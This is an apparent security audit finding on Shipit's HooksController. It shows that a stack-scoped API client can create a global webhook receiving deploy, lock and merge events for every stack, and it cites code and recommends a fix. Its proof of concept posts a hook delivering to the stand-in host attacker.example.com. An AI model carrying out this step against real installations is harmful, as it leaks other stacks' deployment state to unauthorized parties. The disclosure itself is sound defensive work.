### Title
API client scoped to a single stack can create a global hook that receives events for every stack - (File: `app/controllers/shipit/api/hooks_controller.rb`)

### Summary
An `ApiClient` can be restricted to a single stack via its `stack_id` attribute, which is meant to bound its `read:stack`/`write:stack`/`deploy:stack`/`lock:stack` operations to that one stack via `BaseController#stacks`. The `Api::HooksController`, however, gates hook creation solely on the `write:hook`/`read:hook` permission and never checks whether the client is stack-scoped. By hitting the top-level `/api/hooks` route (mounted outside the `/stacks/*stack_id` scope) with no `stack_id` parameter, a client that only holds authorization for one stack can create a **global** hook (`stack_id: nil`) that is delivered `Hook.deliver` events for every stack in the installation, breaking the equality "stack a token authorizes == stack whose events it can receive."

### Finding Description
`BaseController#stacks` restricts an `ApiClient` to its own stack when `stack_id` is set: [1](#0-0) 

`Api::HooksController` only requires the coarse `read:hook`/`write:hook` permissions declared on `ApiClient::PERMISSIONS`, with no reference to the client's stack scoping: [2](#0-1) 

The controller computes the hook's `stack_id` purely from whether a `stack_id` URL param was supplied: [3](#0-2) 

Routes expose both a stack-scoped hooks collection and a global, unscoped one: [4](#0-3) 

`Hook.deliver` fans out events to **all** hooks matching `for_stack(stack_id)`, which explicitly includes hooks with `stack_id: nil` regardless of which stack emitted the event: [5](#0-4) 

Because a stack-scoped `ApiClient` (e.g. the `here_come_the_walrus` fixture, `stack: shipit`) is authorized only for `Stack.where(id: current_api_client.stack_id)`, an attacker holding that token is expected to be confined to that stack. But if such a token also carries `write:hook` (a plausible pairing — nothing prevents combining `write:hook` with a stack-scoped client), POSTing to `/api/hooks` (not `/stacks/:id/hooks`) creates a hook with `stack_id: nil`, which then receives `stack`, `deploy`, `rollback`, `lock`, `task`, `merge`, `commit_status`, `deployable_status`, `merge_status`, and `pull_request` events for every stack managed by the installation — including stacks the token was never authorized to read.

**Binding broken:** stack a token authorizes (`current_api_client.stack_id`) ≠ stack whose events the token's created hook can observe (`nil`, i.e. all stacks).

### Impact Explanation
This qualifies as High severity under the listed impact categories: "unauthenticated read of stack state, task streams or deploy output" — an attacker with a low-privilege, single-stack-scoped API token can, via a global hook delivering to an attacker-controlled URL, obtain a continuous read-only exfiltration channel for the state, commit SHAs, deploy/rollback status, lock status, and pull-request/merge activity of every stack in the Shipit installation, not just the one stack the token was issued for.

### Likelihood Explanation
Low-to-medium likelihood: it requires a caller to hold both a stack-scoped `ApiClient` credential and the `write:hook` permission simultaneously, and for that credential to be treated by the operator as "confined to one stack" when granting it (nothing in the model or admin UI documents that `write:hook` implicitly grants global hook creation regardless of `stack_id`). Since `ApiClientsController` in the admin UI lets any authenticated Shipit user create clients with arbitrary permission combinations, and the `stack_id` scoping field is a first-class, advertised confinement mechanism (used to scope `read:stack`/`write:stack`), an operator could reasonably expect `stack_id` to also confine `write:hook`.

### Recommendation
Enforce the client's `stack_id` scoping in `Api::HooksController`: if `current_api_client.stack_id?` is true, forbid access to (or force-scope) the global `/api/hooks` collection, and require that any created/updated hook's `stack_id` match the client's authorized stack. Concretely, derive `stack_id` from `current_api_client.stack_id` when present, instead of trusting the mere presence/absence of the `stack_id` URL parameter, and reject `write:hook` calls to the unscoped collection for stack-scoped clients.

### Proof of Concept
1. Create an `ApiClient` with `stack_id` set to Stack A and permissions `['write:hook']` (via `Api::ApiClientsController`/admin UI or fixtures such as `here_come_the_walrus` plus `write:hook`).
2. Authenticate as this client and `POST /api/hooks` (the top-level, unscoped route from `config/routes.rb` line 46) with `{ delivery_url: "https://attacker.example.com/collect", events: ["deploy", "rollback", "stack", "lock", "merge"] }`.
3. `HooksController#hooks` computes `stack_id` as `nil` because no `stack_id` route param is present (`app/controllers/shipit/api/hooks_controller.rb:50-52`), so the created `Hook` has `stack_id: nil`, i.e., global.
4. Any deploy/rollback/lock/merge event on **any** stack in the installation (including stacks unrelated to Stack A) now triggers `Hook.deliver`, which matches this global hook via `Hook.for_stack(stack_id)` (`app/models/shipit/hook.rb:93-119`) and POSTs the event payload to the attacker's `delivery_url`, leaking cross-stack state to a credential that was only authorized for Stack A.

### Citations

**File:** app/controllers/shipit/api/base_controller.rb (L74-80)
```ruby
      def stacks
        @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
      end

      def stack
        @stack ||= stacks.from_param!(params[:stack_id])
      end
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L1-24)
```ruby
# frozen_string_literal: true

module Shipit
  module Api
    class HooksController < BaseController
      require_permission :read, :hook, only: %i[index show]
      require_permission :write, :hook, only: %i[create update destroy]

      def index
        render_resources(hooks)
      end

      def show
        render(json: hook)
      end

      params do
        requires :delivery_url, String
        requires :events, Array[String]
        accepts :content_type, String
      end
      def create
        render_resource(hooks.create(params))
      end
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L42-52)
```ruby
      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
```

**File:** config/routes.rb (L17-47)
```ruby
  namespace :api do
    root to: 'base#index'
    resources :stacks, only: %i[index create]
    scope '/stacks/*id', id: stack_id_format, as: :stack do
      get '/' => 'stacks#show'
      delete '/' => 'stacks#destroy'
      patch '/' => 'stacks#update'
      post '/refresh' => 'stacks#refresh'
    end

    scope '/stacks/*stack_id', stack_id: stack_id_format, as: :stack do
      get '/ccmenu' => 'ccmenu#show', as: :ccmenu
      resource :lock, only: %i[create update destroy]
      resources :tasks, only: %i[index show] do
        resource :output, only: :show
        member do
          put :abort
        end
      end
      resources :deploys, only: %i[index create] do
        resources :release_statuses, only: %i[create]
      end
      resources :rollbacks, only: %i[create]
      resources :commits, only: %i[index]
      resources :merge_requests, only: %i[index show update destroy]
      post '/task/:task_name' => 'tasks#trigger', as: :trigger_task
      resources :hooks, only: %i[index create show update destroy]
    end

    resources :hooks, only: %i[index create show update destroy]
  end
```

**File:** app/models/shipit/hook.rb (L93-119)
```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```
